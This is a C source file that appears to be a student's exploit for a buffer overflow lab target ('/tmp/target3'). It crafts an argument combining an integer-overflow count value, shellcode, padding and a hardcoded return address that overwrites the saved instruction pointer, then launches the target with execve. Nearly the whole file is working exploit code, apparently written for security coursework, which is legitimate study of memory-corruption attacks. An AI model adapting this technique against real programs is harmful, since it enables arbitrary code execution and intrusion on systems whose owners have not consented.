#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

// buf is 554*32 bytes, we will overwrite next 32 bytes
#define STR_SIZE (555*32) // hex value is 0x22B
int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[2] = NULL;
  env[0] = NULL;
  
  // (badInt*32)/32 = 555
  char * badInt = "2147484203,"; 
  char badStr[STR_SIZE];

  int i = 0;
  // add our large number to the string
  for(i = 0; i < 11; i++) {
      badStr[i] = badInt[i];
  }
  int shIndex = 0;
  // add shellcode to our string
  for(i; i < 11 + 45; i++) {
      badStr[i] = shellcode[shIndex++];
  }
  // fill bytes up until we hit the eip
  for(i; i < STR_SIZE - 1 - 8; i++) {
   badStr[i] = 0x22;
  }

  // overwrite eip
  *((int *) (badStr +i)) = 0xbfff7390;
  i+=4; // eip takes four bytes
  // fill remainder of buf up. end with null char
  for(i; i < STR_SIZE-1;i++) {
   badStr[i] = 0x22;
   printf("here\n");
  }
  badStr[STR_SIZE-1] = 0x00; 
  // add string to args list
  args[1] = badStr;
  // execute
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
